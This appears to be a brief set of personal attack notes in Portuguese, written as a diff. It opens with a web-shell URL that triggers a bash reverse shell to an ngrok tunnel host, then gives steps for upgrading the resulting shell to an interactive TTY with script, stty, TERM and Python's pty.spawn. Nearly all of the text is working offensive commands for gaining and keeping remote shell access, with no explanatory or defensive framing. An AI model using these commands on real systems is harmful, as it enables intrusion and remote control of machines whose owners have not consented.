@@ -1,0 +1,20 @@
+http://ip/shell.php?cmd=bash+-c+%27bash+-i+%3E%26+/dev/tcp/0.tcp.sa.ngrok.io/numerodongrok+0%3E%261%27
+Roda:
+
+script -qc /bin/bash /dev/null
+
+
+Se existir, isso já cria um pseudo-tty.
+
+2) Ajusta o terminal
+
+Ainda dentro dela:
+
+export TERM=xterm
+stty rows 40 columns 120
+
+
+Testa:
+
+clear
+python3 -c 'import pty; pty.spawn("/bin/bash")'
